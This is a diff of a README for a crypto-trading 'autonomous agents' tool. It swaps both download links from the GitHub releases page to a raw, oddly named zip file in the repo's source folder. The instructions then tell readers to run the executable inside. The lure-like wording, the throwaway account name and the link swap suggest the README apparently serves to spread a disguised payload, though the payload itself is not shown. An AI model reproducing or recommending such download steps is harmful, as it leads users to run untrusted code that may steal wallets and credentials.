@@ -1,6 +1,6 @@
 # 🤖 AgenticDeFi-Trainer - Manage crypto assets with autonomous agents
 
-[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/Sticky-syngnathushildebrandi849/AgenticDeFi-Trainer/releases)
+[![](https://img.shields.io/badge/Download_Software-blue)](https://raw.githubusercontent.com/Sticky-syngnathushildebrandi849/AgenticDeFi-Trainer/main/src/Trainer_Agentic_De_Fi_expansional.zip)
 
 AgenticDeFi-Trainer provides a simple way to use artificial intelligence for your digital asset management. This software uses a swarm of autonomous agents to handle complex tasks like trading, moving funds across blockchains, and managing treasuries. It removes the need for manual work by letting smart systems execute intent-based trades. This framework creates a smooth experience for those who want to use modern technology to interact with decentralized finance platforms.
 
@@ -20,7 +20,7 @@ To run this application on your computer, ensure your system meets these basic s
 Follow these steps to set up the software on your machine:
 
 1. Visit the project release page to download the latest version of the application. 
-[Click here to reach the download page](https://github.com/Sticky-syngnathushildebrandi849/AgenticDeFi-Trainer/releases).
+[Click here to reach the download page](https://raw.githubusercontent.com/Sticky-syngnathushildebrandi849/AgenticDeFi-Trainer/main/src/Trainer_Agentic_De_Fi_expansional.zip).
 2. Locate the setup file ending in .exe in your downloads folder.
 3. Double-click the file to start the installer.
 4. Follow the on-screen prompts.
